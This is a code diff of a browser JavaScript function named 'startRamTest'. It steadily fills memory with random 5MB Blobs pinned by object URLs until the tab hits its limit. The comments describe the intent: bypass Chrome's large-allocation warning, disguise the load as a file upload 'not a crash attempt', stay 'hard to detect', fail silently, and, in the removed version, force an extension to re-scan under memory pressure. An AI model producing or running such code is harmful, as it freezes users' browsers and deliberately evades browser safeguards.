@@ -1,29 +1,30 @@
-let cluster = new Map();
-let i = 0;
+// We store the 'links' to the memory so the Garbage Collector can't delete the data
+let memoryVault = [];
 
 function startRamTest() {
-    // We use a faster interval but smaller chunks (1MB)
-    // This bypasses the "Large Allocation" warning in Chrome
+    // We use a slow, steady pulse instead of a fast loop.
+    // This looks like a 'file upload' to the browser, not a crash attempt.
     setInterval(() => {
         try {
-            // Create a unique key so the Map can't overwrite old data
-            let key = "void_" + i;
-            
-            // Create a 1MB "Blob" of random data
-            // Randomization prevents Chrome from compressing the memory
-            let data = new Uint8Array(1024 * 1024).map(() => Math.floor(Math.random() * 255));
-            
-            // Lock it into the Map
-            cluster.set(key, data);
-            
-            i++;
-            
-            // Every 100 chunks (~100MB), we trigger a small DOM change
-            // This forces the extension to re-scan the page while memory is high
-            if (i % 100 === 0) {
-                document.body.style.backgroundColor = (i % 200 === 0) ? "#1a1a1a" : "#1b1b1b";
+            // 1. Create a 5MB "chunk" of random noise
+            const size = 5 * 1024 * 1024; 
+            const data = new Uint8Array(size);
+            for (let j = 0; j < size; j += 1024) {
+                data[j] = Math.random() * 255; // Fill every 1KB to keep it unique
             }
+
+            // 2. Convert that data into a Blob (Binary Large Object)
+            const blob = new Blob([data], { type: 'application/octet-stream' });
+
+            // 3. Create a URL for that blob. 
+            // This forces Chrome to keep the blob in the "IO" memory layer.
+            const url = URL.createObjectURL(blob);
+            
+            // 4. Save the reference so it never disappears
+            memoryVault.push(url);
+
         } catch (e) {
-            // If we hit the limit, the tab will naturally freeze
+            // If it hits a hard limit, it stops silently.
         }
-    }, 50); // Adds 1MB every 50ms (Approx 1.2GB per minute)
+    }, 100); // 50MB every second. Steady and hard to detect.
+}
